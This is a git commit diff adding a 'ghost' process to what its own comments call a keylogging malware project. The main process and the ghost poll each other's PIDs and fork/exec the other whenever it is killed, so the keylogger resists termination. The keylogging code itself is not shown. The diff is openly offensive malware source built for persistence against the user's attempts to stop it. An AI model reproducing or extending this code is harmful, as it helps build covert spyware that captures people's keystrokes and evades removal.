501ecab8490f300433c622780b3462afcf90d742
Matias Grioni <matgrioni@gmail.com>
2016-11-25 16:17:17 -0500

    If parent process is killed child process restarts it

---
+++ ghost.c
@@ -0,0 +1,61 @@
+/*
+ * This will be a ghost process whose only purpose is to start the
+ * main keylogging process if it is terminated. Conversely, the main
+ * keylogging process will keep track to see if this process is
+ * running as well.
+ *
+ * The current implementation to achieve this is simply polling the
+ * proc directory for a certain pid. A better implementation would
+ * be able to be notified on any process being killed. That way any
+ * process which is killed can be checked to see if it is one of the
+ * processes in the malware. This would make the startup of a killed
+ * process much faster.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#include "process.h"
+
+pid_t exec_main();
+
+int main(int argc, char **argv)
+{
+    if (argc < 2)
+    {
+        printf("Not enough arguments provided\n");
+        exit(1);
+    }
+
+    pid_t parent_id = atoi(argv[1]);
+
+    pid_t cur_pid = parent_id;
+    while(1)
+    {
+        cur_pid = process_periodic_check(cur_pid, 5, -1, exec_main);
+    }
+
+    return 0;
+}
+
+pid_t exec_main()
+{
+    printf("Starting main...\n");
+    pid_t parent_id = getpid();
+    pid_t pid = fork();
+    if (pid < 0)
+    {
+        printf("There was an error forking. Exiting...\n");
+        exit(1);
+    }
+    else if (pid == 0)
+    {
+        char str_id[6];
+        sprintf(str_id, "%d", parent_id);
+
+        execlp("./main", "./main", str_id, NULL);
+    }
+
+    return pid;
+}
--- main.c
+++ main.c
@@ -1,14 +1,46 @@
 #include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
 
 #include "process.h"
 
-int main()
+pid_t exec_ghost();
+
+int main(int argc, char **argv)
 {
-    int pid;
-    while (1)
+    pid_t id;
+    if (argc < 2)
+        id = exec_ghost();
+    else
+        id = atoi(argv[1]);
+
+    pid_t cur_pid = id;
+    while(1)
     {
-        scanf("%d", &pid);
-        printf("%d\n", exists_task_by_id(pid));
+        cur_pid = process_periodic_check(cur_pid, 5, -1, exec_ghost);
     }
+
     return 0;
+}
+
+pid_t exec_ghost()
+{
+    pid_t parent_id = getpid();
+    pid_t id = fork();
+
+    if (id < 0)
+    {
+        printf("There was an error forking. Exiting...\n");
+        exit(1);
+    }
+    else if (id == 0)
+    {
+        char str_id[6];
+        sprintf(str_id, "%d", parent_id);
+
+        printf("Starting ghost...\n");
+        execlp("./ghost", "./ghost", str_id, NULL);
+    }
+
+    return id;
 }
